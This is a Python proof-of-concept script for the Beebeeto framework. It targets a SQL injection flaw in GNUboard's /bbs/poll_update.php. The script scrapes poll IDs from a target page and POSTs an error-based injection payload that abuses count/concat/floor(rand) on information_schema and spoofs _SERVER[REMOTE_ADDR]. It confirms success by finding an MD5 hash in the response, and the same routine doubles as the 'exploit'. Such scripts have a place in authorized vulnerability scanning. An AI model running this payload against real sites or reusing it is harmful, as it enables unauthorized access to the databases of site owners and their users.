#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0063',
            'name': 'GNUboard /bbs/poll_update.php SQL Injection Vulnerability POC',
            'author': '1024',
            'create_date': '2015-03-13',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'GNUboard',
            'vul_version': ['*'],
            'type': 'SQL Injection',
            'tag': ['GNUboard漏洞', 'SQL注入漏洞', '/bbs/poll_update.php', 'php'],
            'desc': 'GNUboard 通用型注入SQL Injection，据测试基本上大部分的版本都可以.',
            'references': ['N/A',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        req = requests.get(url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + url
        if req.status_code == 200:
            po_ids = re.findall(r'name="po_id" value="(\d+)"', req.content)
            for po_id in po_ids:
                verify_url = url + '/poll_update.php'
                post = ("_SERVER[REMOTE_ADDR]=86117&po_id=%s&gb_poll=1=1 and(select 1 from(select"
                        "count(*),concat((select md5(123)),floor(rand(0)*2))x from information_schema.tables group by"
                        "x)a)") % po_id
                if args['options']['verbose']:
                    print '[*] Request URL: ' + verify_url
                    print '[*] POST Content: ' + post
                reqp = requests.post(verify_url, data=post)
                if reqp.status_code == 200 and '202cb962ac59075b964b07152d234b70' in reqp.content:
                    args['success'] = True
                    args['poc_ret']['vul_url'] = verify_url
                    args['poc_ret']['post_content'] = post
                    return args
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())